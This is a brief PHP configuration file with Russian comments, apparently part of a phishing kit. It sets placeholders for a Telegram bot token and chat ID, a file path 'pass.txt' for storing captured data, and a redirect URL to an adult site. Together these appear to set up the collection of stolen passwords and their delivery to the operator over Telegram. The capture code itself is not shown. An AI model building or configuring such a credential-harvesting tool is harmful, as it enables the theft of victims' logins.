<?php
/**
 * Created by PhpStorm.
 * User: tw1nz
 * Date: 21.12.2019
 * Time: 19:34
 */
/*

*/

// API-токен бота

define('TELEGRAM_TOKEN', 'сюда токен вставь');

// id telegram
define('TELEGRAM_CHATID', 'а сюда id');
////////////////
$bd_files = "batbat/pass.txt";   ///Пусть к сохранению данных ***
$location = "https://pornhub.com" ;  ////Редирект